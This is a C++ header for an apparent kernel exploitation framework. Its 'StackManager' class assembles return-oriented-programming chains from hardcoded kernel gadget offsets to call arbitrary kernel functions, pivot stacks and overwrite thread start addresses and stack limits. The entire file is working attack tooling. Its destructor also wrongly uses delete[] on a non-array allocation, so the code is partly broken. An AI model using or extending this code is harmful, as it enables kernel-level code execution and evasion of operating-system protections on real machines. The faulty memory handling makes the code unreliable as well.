#pragma once
#include <vector>
#include <string_view>
#include <include/driver/kernel_addresses.hpp>

class StackManager
{
protected:
	std::vector<std::uint64_t>* Stack = nullptr;
private:
	std::uintptr_t KernelModuleBase = NULL;
	std::uintptr_t StackAllocAddress = NULL;
	std::size_t StackSizeLimit = NULL;
    void ChainStack(StackManager* NewStack);
    void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);

public:
	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAllocAddress, const size_t _StackSizeLimit = 0x2000)
		: KernelModuleBase(_KernelModuleBase), StackAllocAddress(_StackAllocAddress), StackSizeLimit(_StackSizeLimit)
	{
		Stack = new std::vector<std::uint64_t>;
	}

	~StackManager()
	{
		delete[] Stack;
	}

    std::uint64_t* GetStackBuffer();
    std::size_t GetStackSize();
    void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
    void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
    void AddPadding(const std::size_t PaddingSize = 8);
    void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
    void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);
    void PivotToNewStack(StackManager* StackToPivot);
    void LoopBack();

    template<typename... Args>
    void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
    {
        constexpr std::size_t ArgCount = sizeof...(Args);
        const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);

        // Setup ropchain for arguments only if there are any
        if constexpr (ArgCount > 0)
        {
            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };

            // Setting up the fourth gadget here, since there is no "pop r9; ret;" gadget universally.
            // this gadget requires us to set up both r8 and rcx correctly, so we will just do this before
            // all other args.
            if (ArgCount >= 4)
            {
                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                this->AddValue(0, "set r8 to 0");
                this->AddPadding(0x28);
                this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
                this->AddPadding(0x8);
                this->AddValue(ConvertedArgs[3], "FourthArg");
                this->AddPadding(0x10);
                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
            }

            if (ArgCount >= 3)
            {
                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
                this->AddValue(ConvertedArgs[2], "ThirdArg");
                this->AddPadding(0x28);
            }

            // If we have any args, we can place a value into rcx (arg1) and rdx (arg2) using a single gadget.
            // The reason this is done instead of a 'pop rcx; ret;' and `pop rdx; ret;` is described in issue #12 on GitHub.
            this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
            this->AddPadding(0x8);
            this->AddValue(ConvertedArgs[0], "FirstArg");
            this->AddValue(ConvertedArgs[1], "SecondArg");
            this->AddPadding(0x8);
        }

        if (this->GetStackSize() % 16 != 0)
            this->AddGadget(0x20043b, "ret (align)");

        this->AddGadget(FunctionAddress, "Function to call address");
        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
        this->AddValue(0, "Shadow space 1");
        this->AddValue(0, "Shadow space 2");
        this->AddValue(0, "Shadow space 3");
        this->AddValue(0, "Shadow space 4");
    }
};
